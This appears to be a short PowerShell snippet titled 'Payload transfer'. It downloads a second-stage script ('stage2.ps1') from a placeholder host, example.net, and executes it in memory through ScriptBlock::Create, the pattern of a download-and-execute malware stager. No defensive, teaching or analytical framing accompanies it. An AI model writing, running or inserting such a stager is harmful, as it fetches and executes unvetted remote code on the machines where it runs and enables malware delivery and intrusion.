# Payload transfer
$RemoteUrl = 'https://example.net:443/stage2.ps1'
$StageScript = (New-Object Net.WebClient).DownloadString($RemoteUrl)
& ([ScriptBlock]::Create($StageScript))
$StageMarker = "stage-14"
